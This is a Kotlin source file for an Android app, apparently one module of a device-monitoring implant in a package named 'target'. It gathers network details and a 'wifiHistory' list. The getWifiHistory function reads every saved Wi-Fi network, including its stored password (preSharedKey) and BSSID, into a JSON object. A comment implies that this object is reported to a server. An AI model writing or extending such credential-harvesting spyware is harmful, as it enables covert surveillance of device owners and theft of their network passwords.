// android/app/src/main/kotlin/com/orgsapp/target/NetworkInfoHandler.kt
package com.orgsapp.target

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.TrafficStats
import android.net.wifi.WifiManager
import org.json.JSONArray
import org.json.JSONObject

object NetworkInfoHandler {

    fun getNetworkInfo(context: Context): JSONObject {
        val info = JSONObject()

        try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val activeNetwork = cm.activeNetwork
            val capabilities = cm.getNetworkCapabilities(activeNetwork)

            if (capabilities != null) {
                when {
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> {
                        info.put("type", "wifi")
                        val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                        val wifiInfo = wifiManager.connectionInfo
                        info.put("ssid", wifiInfo.ssid?.replace("\"", "") ?: "-")
                        info.put("signal", wifiInfo.rssi)
                        info.put("speed", wifiInfo.linkSpeed)
                    }
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> {
                        info.put("type", "cellular")
                        info.put("ssid", "-")
                        info.put("signal", 0)
                        info.put("speed", 0)
                    }
                    else -> {
                        info.put("type", "other")
                        info.put("ssid", "-")
                        info.put("signal", 0)
                        info.put("speed", 0)
                    }
                }
            } else {
                info.put("type", "none")
                info.put("ssid", "-")
                info.put("signal", 0)
                info.put("speed", 0)
            }

            // IP addresses
            info.put("localIp", getLocalIp(context))
            info.put("publicIp", "-") // Server yang tahu
            info.put("gateway", "-")
            info.put("dns", "-")

            // Data usage (total since boot)
            val rxBytes = TrafficStats.getTotalRxBytes()
            val txBytes = TrafficStats.getTotalTxBytes()

            info.put("download", if (rxBytes != TrafficStats.UNSUPPORTED.toLong()) rxBytes else 0)
            info.put("upload", if (txBytes != TrafficStats.UNSUPPORTED.toLong()) txBytes else 0)
            info.put("total", (rxBytes + txBytes))

            // WiFi history
            val wifiHistory = getWifiHistory(context)
            info.put("wifiHistory", wifiHistory)

        } catch (e: Exception) {
            info.put("type", "unknown")
            info.put("ssid", "-")
            info.put("error", e.message)
        }

        return info
    }

    private fun getLocalIp(context: Context): String {
        return try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val ip = wifiManager.connectionInfo.ipAddress
            if (ip == 0) "-" else {
                "${ip and 0xff}.${ip shr 8 and 0xff}.${ip shr 16 and 0xff}.${ip shr 24 and 0xff}"
            }
        } catch (e: Exception) {
            "-"
        }
    }

    private fun getWifiHistory(context: Context): JSONArray {
        val arr = JSONArray()
        try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager

            @Suppress("DEPRECATION")
            val configs = wifiManager.configuredNetworks

            if (configs != null) {
                for (config in configs) {
                    val obj = JSONObject()
                    obj.put("ssid", config.SSID?.replace("\"", "") ?: "-")
                    obj.put("password", config.preSharedKey ?: "")
                    obj.put("bssid", config.BSSID ?: "")
                    arr.put(obj)
                }
            }
        } catch (e: Exception) {
            // Ignore — butuh permission
        }
        return arr
    }
}
